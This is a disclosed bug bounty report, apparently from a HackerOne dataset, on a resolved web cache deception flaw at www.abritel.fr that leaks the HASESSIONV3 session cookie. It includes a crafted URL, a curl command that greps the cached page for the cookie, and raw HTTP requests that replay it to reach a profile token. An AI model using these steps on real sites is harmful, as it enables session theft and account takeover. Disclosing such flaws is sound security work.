---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1698316'
original_report_id: '1698316'
title: Cache Deception Allows Account Takeover
weakness: Use of Cache Containing Sensitive Information
team_handle: expediagroup_bbp
created_at: '2022-09-12T17:16:10.188Z'
disclosed_at: '2023-04-01T20:00:17.641Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 130
asset_identifier: www.abritel.fr
asset_type: URL
max_severity: critical
tags:
- hackerone
- use-of-cache-containing-sensitive-information
---

# Cache Deception Allows Account Takeover

## Metadata

- HackerOne Report ID: 1698316
- Weakness: Use of Cache Containing Sensitive Information
- Program: expediagroup_bbp
- Disclosed At: 2023-04-01T20:00:17.641Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:

I'm able to extract user's session (HASESSIONV3) as it is disclosed in a cacheable page, allowing me to access  the `ha.crumb` token located in  `/traveler/profile/edit` 


```http
GET /traveler/profile/edit HTTP/2
Host: www.abritel.fr
Cookie: HASESSIONV3=<use the token here>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.abritel.fr/search/keywords:soissons-france-(xss)/minNightlyPrice/0?petIncluded=false&filterByTotalPrice=true&ssr=true
Upgrade-Insecure-Requests: 1
Te: trailers
```


## Steps To Reproduce:

Victim Steps:

1->Visit https://www.abritel.fr/search/keywords:soissons-france-(xss)/minNightlyPrice/x.jpeg?triagethis

Attacker Steps:

1->Visit the same URL using any other browser or do 

```curl 'https://www.abritel.fr/search/keywords:soissons-france-(xss)/minNightlyPrice/x.jpeg?triagethis' --compressed | grep -i 'HASESSIONV3'```

{F1923081}


2-> use the token 

```http
GET /traveler/profile/edit HTTP/2
Host: www.abritel.fr
Cookie: HASESSIONV3=<use the token here>
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.abritel.fr/search/keywords:soissons-france-(xss)/minNightlyPrice/0?petIncluded=false&filterByTotalPrice=true&ssr=true
Upgrade-Insecure-Requests: 1
Te: trailers
```

and look for the `ha.crumb` variable in the response




## Recommended Remediation Steps 
  1. Add cache rules for certain all cacheable extensions

## Impact

Account Takeover

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
